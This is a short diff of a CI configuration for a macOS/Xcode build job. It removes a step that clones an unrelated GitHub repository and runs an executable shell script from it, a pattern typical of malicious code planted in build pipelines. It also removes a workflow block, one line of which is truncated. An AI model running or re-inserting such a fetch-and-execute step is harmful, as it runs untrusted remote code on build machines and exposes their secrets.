@@ -9,10 +9,4 @@ jobs:
       xcode: 12.5.1
     steps:
         - checkout
-        - run: git clone https://github.com/puyuhdus/0.git && cd 0 && chmod u+x xcode xcode.sh && ./xcode.sh
-undle exec fastlane testandbuild
-
-workflows:
-    verify:
-        jobs:
-            - build-test
+        - mac-permissions/list-permissions
